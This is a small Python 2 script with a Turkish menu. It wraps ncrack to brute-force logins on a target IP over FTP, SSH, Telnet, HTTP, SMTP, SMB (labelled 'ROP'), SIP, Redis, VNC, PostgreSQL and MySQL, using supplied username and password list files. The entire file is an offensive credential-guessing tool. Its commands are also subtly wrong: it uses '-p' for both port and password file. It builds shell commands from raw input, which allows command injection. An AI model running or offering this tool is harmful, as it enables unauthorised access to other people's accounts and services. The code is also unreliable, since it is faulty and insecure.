import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet brute-force")
print("""
Brute force aracına hosgeldiniz :
1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMTP
6) ROP
7) SIP
8) Redis
9) VNC
10) PostgreSQL
11) MySQL
""")
islemno = raw_input("İşlem numarasını giriniz: ")
hedefip = raw_input("Hedef IP adresi: ")
kullanıcıadı = raw_input("Kullanıcı adı dosya yolu: ")
sifre = raw_input("Sifre dosya yolu: ")

if(islemno == "1"):
    os.system("ncrack -p 21 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "2"):
    os.system("ncrack -p 22 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "3"):
    os.system("ncrack -p 23 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "4"):
    os.system("ncrack -p 80 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "5"):
    os.system("ncrack -p 25 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "6"):
    os.system("ncrack -p 445 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "7"):
    os.system("ncrack -p 5060 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "8"):
    os.system("ncrack -p 6379 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "9"):
    os.system("ncrack -p 5900 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "10"):
    os.system("ncrack -p 5432 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
elif(islemno == "11"):
    os.system("ncrack -p 3306 -u " + kullanıcıadı + " -p " + sifre + " " + hedefip)
else:
    print("Geçersiz işlem numarası. Lütfen 1-11 arasında bir sayı giriniz.")
    exit(1)